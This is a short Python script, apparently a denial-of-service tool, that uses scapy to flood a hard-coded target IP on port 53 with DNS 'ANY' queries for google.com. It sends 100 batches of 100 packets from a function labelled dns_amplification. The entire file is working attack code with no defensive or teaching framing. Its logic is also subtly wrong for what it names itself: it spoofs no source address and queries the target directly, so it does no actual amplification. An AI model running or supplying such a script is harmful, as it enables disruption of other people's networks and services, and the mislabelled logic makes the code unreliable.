from scapy.all import IP, UDP, DNS, DNSQR, send
import random
import tqdm

def dns_amplification(target_ip, port, query_type, qname, num_requests, source_port):
    packets = [
        (IP(dst=target_ip) /
         UDP(sport=source_port, dport=port) /
         DNS(
             id=random.randint(0, 0xFFFF),
             rd=1,
             qd=DNSQR(qname=qname, qtype=query_type, qclass="IN")
         ))
        for _ in range(num_requests)
    ]
    send(packets, verbose=0)

if __name__ == "__main__":
    TARGET_IP = "191.168.1.23"
    PORT = 53
    QUERY_TYPE = "ANY"
    QNAME = "google.com"
    NUM_REQUESTS = 100  
    SOURCE_PORT = 50000
    for _ in tqdm.tqdm(range(NUM_REQUESTS), desc="Sending DNS Requests"):
        dns_amplification(TARGET_IP, PORT, QUERY_TYPE, QNAME, NUM_REQUESTS, SOURCE_PORT)
